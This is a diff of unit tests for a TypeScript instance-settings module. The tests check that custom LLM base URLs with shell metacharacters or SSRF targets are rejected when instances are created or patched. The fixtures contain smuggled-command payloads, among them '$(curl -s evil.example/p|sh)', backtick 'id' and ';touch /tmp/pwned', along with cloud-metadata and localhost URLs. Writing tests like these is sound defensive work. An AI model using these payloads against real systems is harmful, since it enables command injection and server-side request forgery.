@@ -4,11 +4,95 @@ process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "a".repeat(64);
 
 import {
   buildAdvancedInstanceConfigPayload,
+  buildStoredInstanceConfig,
   getPublicInstanceConfig,
   getRuntimeAgentSettings,
 } from "@/lib/instance-settings";
 
 describe("instance settings", () => {
+  it("rejects a hostile custom LLM base URL at the buildStoredInstanceConfig chokepoint (instance creation path)", () => {
+    // Instance creation does not go through buildAdvancedInstanceConfigPayload —
+    // it passes the zod-parsed agentSettings straight into
+    // buildStoredInstanceConfig. That chokepoint must apply the same shared
+    // validation or the create boundary stays a shell-injection hole even with
+    // the PATCH path covered.
+    for (const customLlmBaseUrl of [
+      "https://x/$(curl -s evil.example/p|sh)",
+      "https://x/`id`",
+      "https://x/v1;touch /tmp/pwned",
+      "https://x/v1\nINJECTED=1",
+      "https://x/v1 with space",
+    ]) {
+      expect(() =>
+        buildStoredInstanceConfig(undefined, { agentSettings: { customLlmBaseUrl } })
+      ).toThrow(/not allowed/);
+    }
+  });
+
+  it("accepts legitimate custom LLM base URLs at the creation chokepoint", () => {
+    for (const customLlmBaseUrl of [
+      "https://llm.example.com/v1",
+      "https://llm.example.com/v1?api-version=2024-01-01",
+      "https://api.groq.com/openai/v1",
+      "https://my-llm-gateway.example.org:8443/openai/v1",
+    ]) {
+      const stored = buildStoredInstanceConfig(undefined, {
+        agentSettings: { customLlmBaseUrl },
+      });
+      expect(getRuntimeAgentSettings(stored).customLlmBaseUrl).toBe(customLlmBaseUrl);
+    }
+  });
+
+  it("does not re-validate legacy stored values on read paths", () => {
+    // Rows written before validation existed must remain readable:
+    // getPublicInstanceConfig re-normalizes through buildStoredInstanceConfig
+    // with an EMPTY patch, which must not throw on the stored value.
+    const legacyConfig = {
+      agentSettings: { customLlmBaseUrl: "https://x/$(touch /tmp/pwned)/v1" },
+    };
+    expect(() => getPublicInstanceConfig(legacyConfig)).not.toThrow();
+    expect(() => buildStoredInstanceConfig(legacyConfig, {})).not.toThrow();
+    // ...but the same value arriving as a NEW patch is rejected.
+    expect(() =>
+      buildStoredInstanceConfig(legacyConfig, {
+        agentSettings: { customLlmBaseUrl: "https://x/$(touch /tmp/pwned)/v1" },
+      })
+    ).toThrow(/not allowed/);
+  });
+
+  it("rejects SSRF-target custom LLM base URLs at the creation chokepoint", () => {
+    for (const customLlmBaseUrl of [
+      "http://169.254.169.254/latest/meta-data",
+      "http://127.0.0.1:11434/v1",
+      "http://192.168.1.20:11434/v1",
+    ]) {
+      expect(() =>
+        buildStoredInstanceConfig(undefined, { agentSettings: { customLlmBaseUrl } })
+      ).toThrow(/not allowed/);
+    }
+  });
+
+  it("rejects a custom LLM base URL carrying shell metacharacters", () => {
+    for (const customLlmBaseUrl of [
+      "https://x/$(curl -s evil.example/p|sh)",
+      "https://x/`id`",
+      "https://x/v1;touch /tmp/pwned",
+      "https://x/v1\nINJECTED=1",
+    ]) {
+      expect(() =>
+        buildAdvancedInstanceConfigPayload({}, { agentSettings: { customLlmBaseUrl } })
+      ).toThrow(/not allowed/);
+    }
+
+    const nextConfig = buildAdvancedInstanceConfigPayload(
+      {},
+      { agentSettings: { customLlmBaseUrl: "https://llm.example.com/v1?api-version=2024-01-01" } }
+    );
+    expect(getRuntimeAgentSettings(nextConfig).customLlmBaseUrl).toBe(
+      "https://llm.example.com/v1?api-version=2024-01-01"
+    );
+  });
+
   it("keeps chat auto-approve off by default and persists explicit toggles", () => {
     expect(getRuntimeAgentSettings({}).autoApproveToolCalls).toBe(false);
 
